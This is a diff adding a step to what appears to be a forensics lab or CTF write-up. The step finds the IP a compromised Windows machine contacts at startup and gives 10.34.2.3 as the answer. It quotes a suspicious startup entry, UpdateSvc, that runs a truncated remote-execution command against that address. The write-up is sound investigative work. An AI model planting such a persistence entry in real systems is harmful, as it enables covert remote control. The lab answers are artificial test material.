@@ -152,4 +152,35 @@ The timestamp corresponds to John’s most recent successful logon.
 #### **Answer**  
 **03/02/2019 5:48:32 PM**
 
+### **4. What IP does the system connect to when it first starts?**
+
+#### **Method**
+
+To identify outbound network connections initiated automatically at startup, the **System Information** tool was examined:
+
+1. Opened:  
+   `System Information → Software Environment → Startup Programs`
+   
+2. Reviewed all startup entries to identify any commands or executables that reference an external IP address.
+
+3. Among the listed startup items, one suspicious entry was found:
+
+- **Program:** UpdateSvc  
+- **Command:** `c:\tmp\p.exe -s \\10.34.2.3 "net ..."`  
+- **User:** Public  
+- **Location:** HKLM\SOFTWARE\...
+
+Screenshot:  
+<img width="1146" height="334" alt="image" src="https://github.com/user-attachments/assets/6b72c33e-bd6c-4ce2-b94b-65a7f50b7403" />
+
+
+This entry clearly shows that the system is attempting to initiate a connection to **10.34.2.3** during startup.  
+Other startup entries do not contain any network-related commands or external IPs.
+
+---
+
+#### **Answer**  
+**10.34.2.3**
+
+
 
